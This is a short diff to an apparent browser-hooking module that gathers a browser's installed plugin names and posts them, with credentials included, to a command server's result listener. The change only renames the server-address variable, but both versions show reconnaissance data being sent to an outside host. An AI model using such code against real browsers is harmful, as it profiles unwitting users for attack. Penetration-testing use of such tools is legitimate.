@@ -12,7 +12,7 @@ Module to return installed browser plugins for assessing vulnerablities
     formData.append('result', pluginNames.join(', '))
     formData.append('module_value', 'browser_plugins.js')
 
-    fetch(`http://${serverAddress}/command/result_listener`, {
+    fetch(`http://${server}/command/result_listener`, {
         method: "POST",
         mode: 'cors',
         credentials: "include",
